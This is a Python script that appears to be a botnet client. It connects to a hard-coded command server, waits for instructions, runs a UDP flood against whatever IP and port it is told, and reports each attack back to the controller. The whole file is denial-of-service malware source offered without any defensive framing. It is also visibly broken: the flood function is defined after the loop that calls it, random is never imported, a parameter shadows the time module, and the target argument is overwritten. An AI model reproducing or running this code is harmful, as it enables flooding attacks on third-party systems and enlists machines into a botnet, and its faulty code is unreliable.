import socket
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port on the server given by the caller
server_address = ('45.129.2.226', 444)
print("connecting to port")
sock.connect(server_address)

device_ip = socket.gethostbyname(socket.gethostname())

while True:
    data = sock.recv(16)

    arg = []

    if ' ' in data:
        arg = data.split(" ")

    if 'ping' in data:
        sock.send(str.encode("ping"))
    elif 'udp' in data:
        UDP(arg[1], arg[2], arg[3])
        sock.send(str.encode(device_ip + " | Attack Sent"))

    print(data)


def UDP(ip, port, time):
    port = int(port)
    randport=(True,False)[port==0]
    ip = sys.argv[1]
    dur = int(time)
    clock=(lambda:0,time.clock)[dur>0]
    duration=(1,(clock()+dur))[dur>0]
    print('Attacking: %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes=random._urandom(65500)
    while True:
        port=(random.randint(1,15000000),port)[randport]
        if clock()<duration:
            sock.sendto(bytes,(ip,port))
        else:
            break
    print('DONE')